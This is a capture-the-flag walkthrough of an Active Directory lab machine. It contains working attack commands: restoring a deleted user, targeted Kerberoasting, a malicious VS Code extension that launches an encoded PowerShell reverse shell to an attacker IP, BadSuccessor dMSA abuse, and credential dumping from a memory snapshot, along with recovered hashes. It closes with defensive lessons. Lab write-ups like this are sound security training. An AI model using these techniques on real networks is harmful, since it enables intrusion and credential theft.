Machine Overview

Checkpoint is an assumed-breach Active Directory box on Windows Server 2025. Starting credentials (alex.turner / Checkpoint2024!) chain through six distinct techniques: AD Recycle Bin restore → targeted Kerberoast to obtain mark.davies → malicious VSIX dropped to DevDrop share triggers a scheduled task that installs and activates the extension as ryan.brooks → BadSuccessor (dMSA) abuse pivots from GenericWrite on svc_deploy to its NT hash → VMBackups share contains a 2GB Server 2019 RAM snapshot → offline Volatility/secretsdump extracts the local Administrator hash → password reuse grants domain admin.

◈
Full Attack Chain: alex.turner (given) → AD Recycle Bin restore + targeted Kerberoast → mark.davies:Checkpoint2024! → malicious .vsix in DevDrop share → VSCodeExtSync scheduled task fires as ryan.brooks → reverse shell + user flag → Rubeus tgtdeleg + bloodyAD BadSuccessor dMSA vs svc_deploy → svc_deploy NT hash → BackupAccess → VMBackups .vmem → Volatility hive dump + secretsdump → Administrator NT hash → domain admin + root flag.

Recon & Setup

01
Nmap + Credential Validation
Reconnaissance · Phase 01

Full port scan confirms a standard Windows DC footprint. Time sync against the DC is required before any Kerberos operations. Validate the provided starting credentials and enumerate SMB shares — DevDrop (READ/WRITE) and VMBackups (access denied to mark.davies at this stage) are immediately noteworthy.

bash — setup
echo "10.129.29.6 checkpoint.htb DC01.checkpoint.htb DC01 dc01" | sudo tee -a /etc/hosts
sudo ntpdate -u 10.129.29.6   ← required for Kerberos
bash — nmap + share enum
nmap -p- --min-rate 3000 10.129.29.6
53,88,135,139,389,445,464,636,3268,3269,5985,9389  → standard DC

nxc smb 10.129.29.6 -u alex.turner -p 'Checkpoint2024!' --shares
output — shares of interest
DevDrop    READ,WRITE   VS Code approved .vsix packages (engine 1.118.0)
VMBackups  ACCESS DENIED  (accessible later via svc_deploy/BackupAccess)
◈
Key Observation: DevDrop is described as a share for "approved .vsix packages." Any write access to a share that auto-installs extensions is an immediate code-execution vector. The target engine version 1.118.0 must match the extension manifest.

Foothold — AD Recycle Bin + Targeted Kerberoast

02
Restore mark.davies from AD Recycle Bin
Recycle Bin · Phase 02

alex.turner holds WRITE over the tombstoned mark.davies object and CREATE_CHILD on the OU. Restoring the deleted user re-enables the account while preserving the original ACE grants — including the SPN-writable WriteProperty needed for targeted Kerberoasting.

bash — restore deleted user
bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb \
  --host DC01.checkpoint.htb \
  set restore mark.davies
03
Targeted Kerberoast → mark.davies
Recycle Bin · Phase 03

The ACE grants WriteProperty on mark.davies — not password reset. Targeted Kerberoasting writes a fake SPN to the restored account, requests a TGS, and cracks the ticket offline. The password reuses the box's common pattern.

bash — write SPN + request TGS
bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb \
  --host DC01.checkpoint.htb \
  set object mark.davies servicePrincipalName -v cifs/markroast

impacket-GetUserSPNs checkpoint.htb/alex.turner:'Checkpoint2024!' \
  -request-user mark.davies -outputfile mark.hash
bash — crack with hashcat
hashcat -m 19700 mark.hash /usr/share/wordlists/rockyou.txt
output
$krb5tgs$...:Checkpoint2024!
✓
Credentials Recovered: mark.davies : Checkpoint2024! — cracked from Kerberoast TGS via rockyou.

VS Code VSIX RCE — ryan.brooks Shell

04
VSCodeExtSync Scheduled Task Mechanism
VSIX RCE · Phase 04

A scheduled task VSCodeExtSync runs as ryan.brooks. Its trigger is Security EventID 4663 — a file-access audit event fired whenever a file is written to the DevDrop share. The action runs vscodesync.ps1, which calls code --install-extension <vsix> --force and then Start-Process Code.exe --no-sandbox — launching VS Code and activating every installed extension in ryan.brooks's context.

powershell — vscodesync.ps1 (key logic)
$shareDir = "C:\Shares\DevDrop"
$codeCli  = "C:\Program Files\Microsoft VS Code\bin\code.cmd"
$codeExe  = "C:\Program Files\Microsoft VS Code\Code.exe"

# For each *.vsix in DevDrop:
& $codeCli --install-extension $vsix.FullName --force
Start-Process -FilePath $codeExe -ArgumentList "--no-sandbox"
# ^ Activates all installed extensions in ryan.brooks context
✕
DevDrop = RCE-as-a-Service: Any .vsix dropped by mark.davies (who has WRITE) triggers install + VS Code launch as ryan.brooks. A VS Code extension runs arbitrary Node.js in activate() — delivering code execution as ryan.brooks without any further exploitation.
05
Craft & Deliver Malicious VSIX
VSIX RCE · Phase 05

A VSIX is a ZIP containing [Content_Types].xml, extension.vsixmanifest, and extension/. The package.json declares engine ^1.118.0 (matching the share's stated requirement) and activationEvents: ["*"]. The extension.js payload spawns a Base64/UTF-16LE-encoded PowerShell reverse shell in activate().

json — package.json (key fields)
{
  "name": "approved-helper",
  "version": "1.0.0",
  "engines": { "vscode": "^1.118.0" },
  "main": "./extension.js",
  "activationEvents": ["onStartupFinished","*"]
}
javascript — extension.js (payload)
const {execSync} = require('child_process')
// Base64-encoded PowerShell reverse shell to 10.10.14.151:9001
const cmd = 'powershell -enc <B64_REVERSE_SHELL>'
execSync(cmd)
exports.activate = () => execSync(cmd)
bash — package + deliver
# Package VSIX
cd exploits/vsix_new
zip -r -X ../approved-helper.vsix '[Content_Types].xml' extension.vsixmanifest extension/

# Listener
nc -lvnp 9001 &

# Deliver to DevDrop — the write fires EventID 4663 which triggers VSCodeExtSync
smbclient //10.129.29.6/DevDrop \
  -U 'checkpoint.htb\mark.davies%Checkpoint2024!' \
  -c 'del approved-helper.vsix; put exploits/approved-helper.vsix approved-helper.vsix'
output — shell received
connect to [10.10.14.151] from [10.129.29.6]
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
✓
Shell as ryan.brooks: The VSCodeExtSync task fires within seconds of the write, installs the extension, launches VS Code, and activate() executes the reverse shell payload.
User Flag — C:\Users\ryan.brooks\Desktop\user.txt

BadSuccessor — dMSA Abuse → svc_deploy NT Hash

06
TGT Delegation + ACL Enumeration
BadSuccessor · Phase 06

Without ryan.brooks's cleartext password, use Rubeus tgtdeleg to extract a TGT via GSS-API delegation, convert it to ccache, and enumerate ACL rights. ryan.brooks holds GenericWrite on svc_deploy and CREATE_CHILD on OU=DMSAHolder — the exact combination needed for BadSuccessor on Windows Server 2025.

powershell — on ryan.brooks shell
# Download Rubeus + extract TGT via GSSAPI delegation
.\r.exe tgtdeleg /nowrap
# Prints base64(TGT kirbi)
bash — convert + enumerate
echo '<base64_kirbi>' | base64 -d > ryan.kirbi
impacket-ticketConverter ryan.kirbi ryan.ccache
export KRB5CCNAME=$PWD/ryan.ccache

bloodyAD -u ryan.brooks -k -d checkpoint.htb --host DC01.checkpoint.htb get writable
output — key ACL edges
CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb   permission: WRITE (GenericWrite)
OU=DMSAHolder,DC=checkpoint,DC=htb                      permission: CREATE_CHILD
07
Why Shadow Credentials & Kerberoast Fail
BadSuccessor · Phase 07

Two common GenericWrite techniques are ruled out before reaching BadSuccessor.

✕
Shadow Credentials fail: certipy shadow auto writes the Key Credential successfully, but PKINIT returns KDC_ERR_PADATA_TYPE_NOSUPP — no AD CS / no KDC certificate on this domain. Shadow creds can't be cashed in for a TGT.
✕
Kerberoasting svc_deploy fails: Forcing RC4 via msDS-SupportedEncryptionTypes=4 with GenericWrite yields a hash that is not in rockyou. No cleartext password — dead end.
08
BadSuccessor (dMSA) — svc_deploy NT Hash
BadSuccessor · Phase 08

Windows Server 2025 introduced Delegated Managed Service Accounts (dMSA). The BadSuccessor technique abuses CREATE_CHILD on an OU to create a dMSA and write msDS-ManagedAccountPrecededByLink pointing to the target account. The KDC then includes the predecessor's keys in S4U authentication responses. The DC is patched (UBR 32860), so we cannot target Administrator directly — but we hold GenericWrite on svc_deploy, making it the valid target.

⚠
Patched DC Caveat: UBR 32860 exceeds the patch threshold (26100.4946) for the original BadSuccessor variant. On patched DCs, msDS-SupersededManagedAccountLink + msDS-SupersededServiceAccountState=2 must be written on the target account — requiring at least GenericWrite on it. We have that on svc_deploy, not Administrator.
bash — create dMSA + extract predecessor keys
export KRB5CCNAME=$PWD/ryan.ccache

bloodyAD -u ryan.brooks -k -d checkpoint.htb --host DC01.checkpoint.htb \
  add badSuccessor deploysucc \
  --ou "OU=DMSAHolder,DC=checkpoint,DC=htb" \
  -t  "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
output — predecessor keys extracted
dMSA previous keys found in TGS:

RC4:    e16081eb077aca74bdbf8af12af43ac9   ← svc_deploy NT hash

10
Volatility 3 Hive Dump + secretsdump
VM Forensics · Phase 10

Volatility 3.28 has no hashdump plugin directly. Instead, dump the SYSTEM, SAM, and SECURITY registry hives from the memory image, then run impacket-secretsdump offline against the extracted hive files.

bash — dump hives with Volatility 3
pipx install volatility3
VOL=~/.local/bin/vol
VMEM="Windows Server 2019-Snapshot1.vmem"

# List hive locations
$VOL -f "$VMEM" windows.registry.hivelist

# Dump SAM, SYSTEM, SECURITY hives
$VOL -o hives -f "$VMEM" windows.registry.hivelist --filter SAM --dump
$VOL -o hives -f "$VMEM" windows.registry.hivelist --filter SYSTEM --dump
$VOL -o hives -f "$VMEM" windows.registry.hivelist --filter SECURITY --dump
bash — offline secretsdump
impacket-secretsdump \
  -sam      hives/registry.SAM.*.hive \
  -system   hives/registry.SYSTEM.*.hive \
  -security hives/registry.SECURITY.*.hive \
  LOCAL
output — local Administrator hash

Administrator Hash Extracted: f29e9c014295b9b32139b09a2790be3b from the VM's local SAM hive. This hash is reused as the domain Administrator password — a critical misconfiguration.

key takeaways
// 01
Auto-Installing Extensions from Shared Storage Is RCE
The VSCodeExtSync design — auto-installing and launching any .vsix dropped in a share — is direct RCE-as-a-service. Extension auto-installation must require code-signing verification, run in a sandboxed identity with no network access, and require explicit admin approval before any extension is activated in a user context.
// 02
AD Recycle Bin Objects Retain Dangerous ACEs
Deleted AD objects retain their ACLs in the Recycle Bin. An over-privileged ACE on a deleted user is not cleaned up on deletion — restoring the object re-activates all those rights. Tombstoned object ACLs must be audited; WRITE/CREATE_CHILD on deleted objects is as dangerous as the same right on live objects.
// 03
BadSuccessor Requires GenericWrite on the dMSA Target
On patched Server 2025 DCs (UBR > 26100.4946), BadSuccessor requires write access to msDS-Superseded* attributes on the target account — meaning GenericWrite on that account is mandatory. Restricting CREATE_CHILD on OUs and auditing GenericWrite delegations against service accounts prevents this attack path.
// 04
VM RAM Snapshots Contain Plaintext-Equivalent Credentials
A .vmem file is a raw physical memory dump containing NT hashes, Kerberos keys, and potentially cleartext passwords. VM backups must be encrypted at rest, access must be tightly scoped (not to broad groups like BackupAccess), and memory snapshots should be excluded from general backup sets.
// 05
Local and Domain Administrator Passwords Must Differ
Password reuse between a VM's local Administrator and the domain Administrator is a complete domain compromise waiting to happen. LAPS must be deployed on all domain-joined machines (including backed-up VMs) to ensure unique, randomly-rotated local Administrator passwords. The domain Administrator credential must never be the same as any local account password.
// 06
Targeted Kerberoast Leverages WriteProperty, Not Password Reset
Targeted Kerberoasting only requires WriteProperty on servicePrincipalName — not password reset rights. Any delegation that allows writing an SPN to a user account enables Kerberoasting that account. AD ACL audits must treat SPN-writable rights as equivalent to credential exposure when the target account's password is crackable.
